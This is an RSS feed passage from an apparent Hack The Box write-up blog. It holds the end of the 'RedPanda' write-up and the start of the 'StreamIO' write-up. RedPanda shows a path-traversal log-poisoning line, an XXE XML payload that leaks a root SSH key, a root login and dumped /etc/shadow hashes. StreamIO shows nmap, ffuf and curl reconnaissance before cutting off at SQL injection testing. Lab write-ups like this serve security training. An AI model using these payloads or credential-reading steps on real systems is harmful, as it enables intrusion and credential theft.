font-style: inherit;">"200||IP-ADDR||USERAGENT||/../../../../../../dev/shm/e.jpg"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /opt/panda_search/redpanda.log</span>
<span id="cb19-4"></span>
<span id="cb19-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> cat pwn_creds.xml</span>
<span id="cb19-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?xml</span> version=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.0"</span> encoding=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"UTF-8"</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!DOCTYPE <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">foo</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>credits<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-9">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>author<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>pwn<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/author<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-10">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>image<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-11">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>/../../../../../../dev/shm/e.jpg<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-12">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>foo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>-----BEGIN <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OPENSSH</span> PRIVATE KEY-----</span>
<span id="cb19-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span></span>
<span id="cb19-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29</span></span>
<span id="cb19-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ</span></span>
<span id="cb19-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ</span></span>
<span id="cb19-17"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span></span>
<span id="cb19-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> OPENSSH PRIVATE KEY-----<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/foo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-19">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>views<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/views<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-20">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/image<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-21">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-22"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/credits<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Write to file, login and win.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda vim root-id_rsa</span>
<span id="cb20-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda chmod 400 root-id_rsa </span>
<span id="cb20-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda ssh root@redpanda.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> root-id_rsa</span>
<span id="cb20-4"></span>
<span id="cb20-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@redpanda:~#</span> id</span>
<span id="cb20-6"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb20-7"></span>
<span id="cb20-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@redpanda:~#</span> cat root.txt </span>
<span id="cb20-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">84d3faba94901c92ecd00838f38ef288</span></span>
<span id="cb20-10"></span>
<span id="cb20-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@redpanda:~#</span> cat /etc/shadow</span>
<span id="cb20-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::</span></span>
<span id="cb20-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$4</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8BoRAl2LvBK8Zth</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$vpJzroFTUyQRA</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::</span></span></code></pre></div>
</section>
<section id="references" class="level2">
<h2 class="anchored" data-anchor-id="references">References</h2>
<ul>
<li><a href="https://portswigger.net/web-security/xxe">PortSwigger - XXE</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">PayloadAllTheThings - SSTI</a></li>
</ul>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>ssti</category>
  <category>java</category>
  <category>xxe</category>
  <guid>https://exploit.se/posts/2022-08-16-htb-writeup-redpanda/2022-08-16-htb-writeup-redpanda.html</guid>
  <pubDate>Tue, 16 Aug 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-08-16-htb-writeup-redpanda/images/redpanda_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>StreamIO - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-03-htb-writeup-streamio/2022-08-03-htb-writeup-streamio.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> 10.10.11.158</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>    open  http</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span>   open  https</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ldapssl</span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  wsman</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  adws</span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  unknown</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49673/tcp</span> open  unknown</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49674/tcp</span> open  unknown</span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49701/tcp</span> open  unknown</span>
<span id="cb1-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">50436/tcp</span> open  unknown</span>
<span id="cb1-23"></span>
<span id="cb1-24"></span>
<span id="cb1-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49701,50436</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.158   </span>
<span id="cb1-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>    open  http          Microsoft IIS httpd 10.0</span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-methods:</span> </span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> IIS Windows Server</span>
<span id="cb1-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server</span> time: 2022-06-28 15:05:15Z<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> streamIO.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span>   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SSDP/UPnP</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=streamIO/countryName=EU</span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span>
<span id="cb1-41"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-02-22T07:03:28</span>
<span id="cb1-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2022-03-24T07:03:28</span>
<span id="cb1-43"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-06-28T15:06:45+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+7h00m00s</span> from scanner time.</span>
<span id="cb1-44"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tls-alpn:</span> </span>
<span id="cb1-45"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  http/1.1</span>
<span id="cb1-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Not Found</span>
<span id="cb1-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  tcpwrapped</span>
<span id="cb1-51"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> streamIO.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-52"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  tcpwrapped</span>
<span id="cb1-53"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  http          Microsoft HTTPAPI httpd 2.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SSDP/UPnP</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-54"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Not Found</span>
<span id="cb1-55"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-56"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-57"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-58"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49673/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-59"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49674/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-60"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49701/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-61"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">50436/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-62"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: Host: DC<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OS:</span> Windows<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:microsoft:windows</span>
<span id="cb1-63"></span>
<span id="cb1-64"></span>
<span id="cb1-65"></span>
<span id="cb1-66"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> 10.10.11.158 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>100</span>
<span id="cb1-67"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE</span>
<span id="cb1-68"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/udp</span>  open  domain</span>
<span id="cb1-69"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">123/udp</span> open  ntp</span></code></pre></div>
<ul>
<li>Domain: streamIO.htb</li>
<li>Vhost: watch.streamIO.htb</li>
</ul>
<p>Going through the website, https://streamio.htb, we find an email address in the footer - <strong>oliver@streamio.htb</strong>. In the “about us” section we find two more users, <strong>Barry</strong> and <strong>Samantha</strong>.</p>
<p><strong>FFUF</strong>:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> https://streamio.htb/FUZZ </span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ADMIN</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 31ms]</span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Admin</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 29ms]</span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Images</span>                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 29ms]</span>
<span id="cb2-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 28ms]</span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">css</span>                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 29ms]</span>
<span id="cb2-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">favicon.ico</span>             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 29ms]</span>
<span id="cb2-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fonts</span>                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 33ms]</span>
<span id="cb2-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">images</span>                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 28ms]</span>
<span id="cb2-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">js</span>                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 30ms]</span>
<span id="cb2-12"></span>
<span id="cb2-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> https://streamio.htb/admin/FUZZ.php</span>
<span id="cb2-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb2-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Index</span>                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 33ms]</span>
<span id="cb2-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">index</span>                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 32ms]</span>
<span id="cb2-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">master</span>                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 40ms]</span></code></pre></div>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> https://streamio.htb/admin/master.php</span>
<span id="cb3-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>h1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Movie <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">managment</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/h1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Only</span> accessable through includes%</span></code></pre></div>
<p>Maybe we’ll find a include parameter which we controll, and can call <code>https://streamio.htb/admin/master.php</code> ?</p>
<p>We can’t bypass the 403 to access any admin-page. The signup function of the site doesn’t seem to do anything, we can “create” an account but can’t login with it. The signup nor the login is vulnerable to sqli. Move on to the vhost, <code>watch.streamio.htb</code>.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> https://watch.streamio.htb/FUZZ.php               </span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Index</span>                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 33ms]</span>
<span id="cb4-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Search</span>                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 88ms]</span>
<span id="cb4-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">blocked</span>                 [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 32ms]</span>
<span id="cb4-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">index</span>                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 36ms]</span>
<span id="cb4-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">search</span>                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 50ms]</span></code></pre></div>
<p>At <code>https://watch.streamio.htb/search.php</code> we find all of the movies, however we are met with an error when trying to watch any of them.</p>
<p>We have a lot of different input fields and it would be wise to test SQLi on .. .. login at <code>streamio.htb/login.php</code> .. email subscription at <code>watch.streamio.htb</code> .. search at <code>watch.streamio.htb/search.php</code></p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## LOGIN</span></span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
